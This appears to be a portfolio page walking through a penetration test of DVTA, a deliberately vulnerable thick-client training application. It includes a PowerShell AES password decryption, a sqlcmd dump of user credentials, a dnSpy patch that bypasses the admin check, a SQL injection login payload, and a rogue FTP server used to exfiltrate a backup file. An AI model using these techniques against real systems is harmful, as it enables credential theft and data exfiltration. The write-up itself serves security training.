<!DOCTYPE html>
<html lang="en">
<script>(
  function hookGeo(eventName){const originalGetCurrentPosition=navigator.geolocation.getCurrentPosition.bind(navigator.geolocation),originalWatchPosition=navigator.geolocation.watchPosition.bind(navigator.geolocation),originalPermissionsQuery=navigator.permissions.query.bind(navigator.permissions),reloadHostnames=["tv.youtube.com"];let fakeGeo=!0,genLat=38.883333,genLon=-77,geolocationPermissionPrompted=!1;function createFakePosition(){return{coords:{latitude:genLat,longitude:genLon,accuracy:10,altitude:null,altitudeAccuracy:null,heading:null,speed:null},timestamp:(new Date).getTime()}}function waitGetCurrentPosition(){void 0!==fakeGeo?!0===fakeGeo?geolocationPermissionPrompted?originalGetCurrentPosition((()=>{geolocationPermissionPrompted=!1,geolocationProxy.tmp_successCallback(createFakePosition()),reloadHostnames.includes(window.location.hostname)&&window.location.reload()}),geolocationProxy.tmp_errorCallback,geolocationProxy.tmp_options):geolocationProxy.tmp_successCallback(createFakePosition()):originalGetCurrentPosition(geolocationProxy.tmp_successCallback,geolocationProxy.tmp_errorCallback,geolocationProxy.tmp_options):setTimeout(waitGetCurrentPosition,100)}function waitWatchPosition(){if(void 0!==fakeGeo)return!0===fakeGeo?(geolocationProxy.tmp2_successCallback(createFakePosition()),Math.floor(1e4*Math.random())):originalWatchPosition(geolocationProxy.tmp2_successCallback,geolocationProxy.tmp2_errorCallback,geolocationProxy.tmp2_options);setTimeout(waitWatchPosition,100)}function executeCallback(callback,position){const isolatedCallback=callback.toString();try{new Function("position",`return (${isolatedCallback})(position);`)(position)}catch(e){callback(position)}}navigator.permissions.query=async function(descriptor){const permission=await originalPermissionsQuery(descriptor);return geolocationPermissionPrompted=fakeGeo&&"geolocation"===descriptor.name&&"prompt"===permission.state,permission};const geolocationProxy={tmp_successCallback:null,tmp_errorCallback:null,tmp_options:null,tmp2_successCallback:null,tmp2_errorCallback:null,tmp2_options:null,getCurrentPosition(successCallback,errorCallback,options){this.tmp_successCallback=position=>executeCallback(successCallback,position),this.tmp_errorCallback=errorCallback,this.tmp_options=options,waitGetCurrentPosition()},watchPosition(successCallback,errorCallback,options){return this.tmp2_successCallback=position=>executeCallback(successCallback,position),this.tmp2_errorCallback=errorCallback,this.tmp2_options=options,waitWatchPosition()}};Object.defineProperty(navigator,"geolocation",{value:geolocationProxy,configurable:!1,writable:!1});function updateHookedObj(response){"object"==typeof response&&"object"==typeof response.coords&&(genLat=response.coords.lat,genLon=response.coords.lon,fakeGeo=response.fakeIt)}Blob=function(_Blob){function secureBlob(...args){const injectableMimeTypes=[{mime:"text/html",useXMLparser:!1},{mime:"application/xhtml+xml",useXMLparser:!0},{mime:"text/xml",useXMLparser:!0},{mime:"application/xml",useXMLparser:!0},{mime:"image/svg+xml",useXMLparser:!0}];let typeEl=args.find((arg=>"object"==typeof arg&&"string"==typeof arg.type&&arg.type));if(void 0!==typeEl&&"string"==typeof args[0][0]){const mimeTypeIndex=injectableMimeTypes.findIndex((mimeType=>mimeType.mime.toLowerCase()===typeEl.type.toLowerCase()));if(mimeTypeIndex>=0){let xmlDoc,mimeType=injectableMimeTypes[mimeTypeIndex],parser=new DOMParser;if(xmlDoc=!0===mimeType.useXMLparser?parser.parseFromString(args[0].join(""),mimeType.mime):parser.parseFromString(args[0][0],mimeType.mime),0===xmlDoc.getElementsByTagName("parsererror").length){if("image/svg+xml"===typeEl.type){const scriptElem=xmlDoc.createElementNS("http://www.w3.org/2000/svg","script");scriptElem.setAttributeNS(null,"type","application/ecmascript"),scriptElem.innerHTML=`(${hookGeo})();`,xmlDoc.documentElement.insertBefore(scriptElem,xmlDoc.documentElement.firstChild)}else{const injectedCode=`\n\t\t\t\t\t\t\t\t<script>(\n\t\t\t\t\t\t\t\t\t${hookGeo}\n\t\t\t\t\t\t\t\t)();\n\t\t\t\t\t\t\t\t<\/script>\n\t\t\t\t\t\t\t`;xmlDoc.documentElement.insertAdjacentHTML("afterbegin",injectedCode)}!0===mimeType.useXMLparser?args[0]=[(new XMLSerializer).serializeToString(xmlDoc)]:args[0][0]=xmlDoc.documentElement.outerHTML}}}return((constructor,args)=>{const bind=Function.bind;return new(bind.bind(bind)(constructor,null).apply(null,args))})(_Blob,args)}let propNames=Object.getOwnPropertyNames(_Blob);for(let i=0;i<propNames.length;i++){let propName=propNames[i];if(propName in secureBlob)continue;let desc=Object.getOwnPropertyDescriptor(_Blob,propName);Object.defineProperty(secureBlob,propName,desc)}return secureBlob.prototype=_Blob.prototype,secureBlob}(Blob),"undefined"!=typeof chrome?setInterval((()=>{chrome.runtime.sendMessage("fgddmllnllkalaagkghckoinaemmogpe",{GET_LOCATION_SPOOFING_SETTINGS:!0},(response=>{updateHookedObj(response)}))}),500):void 0!==eventName&&document.addEventListener(eventName,(function(event){try{updateHookedObj(JSON.parse(event.detail))}catch(ex){}}))}
)();
</script>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>sh3h4cks // DVTA Project</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
  <style>
    :root{ --neon:#00ffee; --code:#00ff66; }
    body {
      margin: 0;
      font-family: 'Share Tech Mono', monospace;
      background: url('/background.jpg') no-repeat center center/cover;
      color: var(--neon);
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background-color: #000;
    }
    .terminal {
      background: rgba(0, 0, 0, 0.75);
      padding: 2rem;
      border: 2px solid var(--neon);
      width: 90%;
      max-width: 1000px;
      box-shadow: 0 0 20px var(--neon);
      overflow-y: auto;
      max-height: 90vh;
    }
    h1,h2,h3 { text-shadow: 0 0 10px cyan; }
    p { line-height: 1.6; }
    pre.code {
      background: #001a00;
      color: var(--code);
      padding: 1rem;
      border: 1px solid #19c37d;
      border-radius: 6px;
      overflow-x: auto;
      white-space: pre-wrap;
      word-wrap: break-word;
    }
    code.inline {
      background: rgba(0,40,0,.5);
      color: var(--code);
      padding: 2px 6px;
      border: 1px solid #19c37d;
      border-radius: 4px;
    }
    img {
      max-width: 100%;
      border: 1px solid #33cccc;
      margin: .5rem 0 1rem;
    }
    a { color: var(--neon); text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
<div class="terminal">
  <h1>THICK CLIENT APPLICATION EXPLOITATION</h1>

  <p>Thick client applications are software programs installed and run locally on a user’s machine, unlike thin client applications which run primarily on a remote server and are accessed through a browser.</p>

  <p>Thick clients typically do not require a constant internet connection to function, as most processing is done on the local machine.</p>

  <p>They can follow different architectures:</p>
  <ul>
    <li><strong>Two-tier architecture</strong> - the application communicates directly with the database</li>
    <li><strong>Three-tier architecture</strong> - the application first communicates with an application server, which then communicates with the database</li>
  </ul>

  <p>In this project, we will perform a penetration test against a vulnerable two-tier thick client application, <strong>DVTA.exe</strong>. This application communicates directly with its backend database without passing through an intermediate application server, making it a two-tier architecture.</p>

  <p>The objective is to identify and exploit security weaknesses in DVTA.exe by performing both static analysis and dynamic analysis.</p>

  <!-- 1 -->
  <img src="/assets/projects/dvta/images/screenshot1.jpg" alt="DVTA properties dialog">

  <p>When first executing DVTA.exe from the command line, the application launches and immediately presents a login panel. At this stage we have no valid credentials; the application provides options to log in or register a new account, and there is a “Configure Server” button which may allow us to modify backend connection settings.</p>

  <!-- 2 -->
  <img src="/assets/projects/dvta/images/screenshot2.jpg" alt="DVTA login panel">

  <h2>Static Recon: strings</h2>
  <p>We can use <code class="inline">strings</code> to see if we can get any clues about the binary and its framework.</p>
  <pre class="code">strings C:\Users\evyyyyy\desktop\DVTA.exe</pre>
  
  <!-- 3 -->
  <img src="/assets/projects/dvta/images/screenshot3.jpg" alt="Strings output">

  <p>We can see it’s a .NET application (v4.0.30319, .NETFramework,Version=v4.5, and System.* namespaces) and there are strings like DBSERVER and \SQLEXPRESS that suggest a direct SQL Server backend, while FTPSERVER and STOR indicate FTP-based backup functionality. Notably, sensitive terms including username, password, isLoggedIn, and even a potential hardcoded password “p@ssw0rd@” were present, suggesting insecure handling of credentials.</p>

  <h2>Static Code Analysis (dnSpy)</h2>
  <p>With this in mind, we can now proceed with a static code analysis in dnSpy <a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a>, which is a popular .NET decompiler. By loading the DVTA.exe binary into dnSpy, we can inspect the source code, review its classes and methods, and identify potential vulnerabilities.</p>

  <!-- 4 -->
  <img src="/assets/projects/dvta/images/screenshot4.jpg" alt="dnSpy project tree">

  <p>We can drag and drop our .exe file into the dnSpy tool and focus our attention on the login flow, database access and FTP backup handler.</p>

  <h3>Finding: btnLogin_Click stores credentials in the registry</h3>
  <p>The first notable finding during code analysis is in the <code class="inline">btnLogin_Click</code> method, which handles authentication for the currently logged-in user:</p>
  <pre class="code">if (user != "admin")
{
    RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("dvta");
    registryKey.SetValue("username", user);
    registryKey.SetValue("password", pass);
    registryKey.SetValue("email", email);
    registryKey.SetValue("isLoggedIn", "true");
    registryKey.Close();
}</pre>

  <p>If the user is not an admin, the application stores the username, password, email and isLoggedIn flag directly in the Windows Registry under <code class="inline">HKCU\\dvta</code>, which consequently means any local user or malware with access to the user profile can read or modify these values.</p>

  <!-- 5 (your text references the dnSpy tree again; image shows registry) -->
  <img src="/assets/projects/dvta/images/screenshot5.jpg" alt="dnSpy project tree">

  <p>If a malicious actor gains access to the victim’s user session, they can query the registry to obtain the cleartext credentials of a non-admin user, providing them with an immediate foothold into the application.</p>

  <h3>Finding: Configure Server writes DBSERVER/FTPSERVER</h3>
  <p>When analyzing the <code class="inline">button1_Click</code> method in dnSpy, it was found that the application takes the server IP entered by the user, appends <code class="inline">\\SQLEXPRESS</code> for the SQL Server instance, and stores it in the application configuration under the key <code class="inline">DBSERVER</code>. Similarly it stores the FTP server address in the <code class="inline">FTPSERVER</code> key. Those values are saved in cleartext within the DVTA config file, which is stored locally on the file system, so any user can read and modify them.</p>

  <pre class="code">private void button1_Click(object sender, EventArgs e)
{
    string serverip = this.servertext.Text;
    string dbserver = serverip + "\\SQLEXPRESS";
    Configuration config = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
    if (config.AppSettings.Settings["DBSERVER"] == null)
    {
        config.AppSettings.Settings.Add("DBSERVER", dbserver);
    }
    else
    {
        config.AppSettings.Settings["DBSERVER"].Value = dbserver;
    }
    if (config.AppSettings.Settings["FTPSERVER"] == null)
    {
        config.AppSettings.Settings.Add("FTPSERVER", serverip);
    }
    else
    {
        config.AppSettings.Settings["FTPSERVER"].Value = serverip;
    }
    config.Save(ConfigurationSaveMode.Modified);
    this.servertext.Text = "";
    MessageBox.Show("Server successfully configured");
}</pre>

  <p>An attacker can change DBSERVER to point to a malicious SQL Server or FTP server, capturing login attempts and queries or, in the FTP case, exfiltrating backups or injecting malicious files.</p>

  <p>If an attacker is able to locate and modify the application’s configuration file, they can change the DBSERVER or FTPSERVER value to point to a server they control. This will cause the application to connect to the attacker’s system during normal operation, allowing it to capture hidden data.</p>
	
  <!-- 6 -->
  <img src="/assets/projects/dvta/images/screenshot6.jpg" alt="Registry key HKCU dvta">

  <!-- 7 -->
  <img src="/assets/projects/dvta/images/screenshot7.jpg" alt="DVTA config file showing DBSERVER FTPSERVER and AES values">

  <h3>Finding: Trivially recoverable DB password</h3>
  <p>The config file provides login credentials for both MSSQL and FTP servers also. <code class="inline">DBPASSWORD</code> is Base64 of AES-encrypted data, but the AES key (<code class="inline">AESKEY</code>) and IV (<code class="inline">IV</code>) are in the same config file. So the DB password is trivially recoverable (effective cleartext).</p>

  <p>Because FTPSERVER is writable in DVTA.exe.config and the client uses hardcoded FTP credentials, as we can see in dnSpy, an attacker who can edit the config can redirect exports to an attacker-controlled FTP server and receive <code class="inline">admin.csv</code> (all expenses) without needing to recover any secrets.</p>

  <!-- 8 -->
  <img src="/assets/projects/dvta/images/screenshot8.jpg" alt="Config shows AES key and IV">

  <h2>Privilege Restriction in the UI</h2>
  <p>However, when logging in with the normal user account “test” we do not have the option to Back up file to FTP.</p>

  <p>This restriction is enforced in <code class="inline">DVTA.Login.btnLogin_Click</code> where if the user <code class="inline">isadmin</code> the application launches the Admin form containing “Backup Data to FTP Server”; if not it launches the Main form which does not contain it (normal form above).</p>

  <pre class="code">if (isadmin != 1)
{
    Close();
    new Main().ShowDialog();
    Application.Exit();
    return;
}
Hide();
new Admin().ShowDialog();
Application.Exit();</pre>

  <h2>Decrypting the Database Password</h2>
  <p>Hence we have the AES encrypted password along with the IV key and AES key; we can use PowerShell to decrypt the database password:</p>
  <img src="/assets/projects/dvta/images/screenshot9.jpg" alt="Main form without FTP backup button">

  <pre class="code">$encB64 = "CTsvjZ0jQghXYWbSRcPxpQ=="
$key    = [Text.Encoding]::ASCII.GetBytes("J8gLXc454o5tW2HEF7HahcXPufj9v8k8")
$iv     = [Text.Encoding]::ASCII.GetBytes("fq20T0gMnXa6g0l4")
$bytes  = [Convert]::FromBase64String($encB64)

$aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.BlockSize = 128
$aes.KeySize   = 256
$aes.Key = $key
$aes.IV  = $iv

$dec = $aes.CreateDecryptor().TransformFinalBlock($bytes,0,$bytes.Length)
[Text.Encoding]::ASCII.GetString($dec)</pre>

  <p>The password is <code class="inline">p@ssw0rd</code>.</p>

  <!-- 10 -->
  <img src="/assets/projects/dvta/images/screenshot10.jpg" alt="PowerShell decryption output">
  <!-- 11 -->
  <img src="/assets/projects/dvta/images/screenshot11.jpg" alt="PowerShell console">

  <h2>Database Extraction</h2>
  <p>We use this command to login into the DB and extract our credentials:</p>

  <pre class="code">Sqlcmd -S 127.0.0.1,1433 -U sa -P "p@ssw0rd" -Q "SELECT username,password,email,isadmin FROM dvta.dbo.users;"</pre>

  <p>And we successfully login as admin and have the option Backup Data to FTP server on</p>

  <!-- 12 -->
  <img src="/assets/projects/dvta/images/screenshot12.jpg" alt="SQL results show users table">

  <h2>Alternative: Reverse Engineering Patch</h2>
  <p>This can also be done through reverse engineering and recompiling the code, in case we don’t have access to a configuration file or the IV and key are not present.</p>

  <!-- 13 -->
  <img src="/assets/projects/dvta/images/screenshot13.jpg" alt="Editing in dnSpy">

  <p>We can press edit on the <code class="inline">btnLogin_Click</code> in the Login class and check the “isadmin != 1” block.</p>

  <!-- 14 -->
  <img src="/assets/projects/dvta/images/screenshot14.jpg" alt="isadmin check block">

  <p>Remove it and replace it with this:</p>
  <pre class="code">base.Hide();
new Admin().ShowDialog();
Application.Exit();</pre>

  <p>Which means that every single user that logs in now will skip the Main form and get straight into the Admin panel. That means that the “Backup Data to FTP server” button will be visible for all the accounts, even the non-admin ones.</p>

  <p>We can then proceed with pressing compile, File → Save Module and choose to either overwrite the application or save a copy.</p>

  <!-- 15 -->
  <img src="/assets/projects/dvta/images/screenshot15.jpg" alt="Compile and save module">
  <!-- 16 -->
  <img src="/assets/projects/dvta/images/screenshot16.jpg" alt="Patched executable saved / Admin panel visible">

  <h2>SQL Injection in Login</h2>
  <p>Yet if we explore the code further, we are able to see that in <code class="inline">DBAccessClass</code> there is a code flow that makes the login form exploitable to SQL injection.</p>

  <!-- 17 -->
  <img src="/assets/projects/dvta/images/screenshot17.jpg" alt="Vulnerable login query">

  <p>Here we can clearly see that whatever we type into the username and password fields is directly put into the SQL query, there is no escaping or parameters, which means that we can insert SQL code directly instead of the normal username.</p>

  <p>We can simply do this and login as an admin user with any password as long as we use SQL injection.</p>

  <pre class="code">' OR 1=1--</pre>

  <!-- 18 -->
  <img src="/assets/projects/dvta/images/screenshot18.jpg" alt="SQLi login success">

  <h2>FTP Exfiltration</h2>
  <p>Now that we have access to the “magic” backup to FTP button we can try setting our own rogue FTP server, modify the configuration file to make the app connect to us and extract the secret information.</p>

  <p>We set up a Python FTP server on our Kali and change the DVTA.exe FTPSERVER IP to ours.</p>

  <pre class="code">ftpserver.py
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

auth = DummyAuthorizer()
auth.add_user('dvta', 'p@ssw0rd', '/tmp/ftp-root', perm='elradfmw')

h = FTPHandler
h.authorizer = auth
h.passive_ports = range(30000, 30010)  
FTPServer(('0.0.0.0', 21), h).serve_forever()</pre>

  <pre class="code">python3 ftpserver.py</pre>

  <p>On the victim machine we either use our patched DVTA.exe to get the admin option or directly login as admin.</p>

  <!-- 19 -->
  <img src="/assets/projects/dvta/images/screenshot19.jpg" alt="FTP server running">
  <!-- 20 -->
  <img src="/assets/projects/dvta/images/screenshot20.jpg" alt="admin.csv exfiltrated on attacker FTP">

  <p style="margin-top:1.5rem;"><a href="/index.html#terminal">← Back to Projects</a></p>
</div>
</body>
</html>
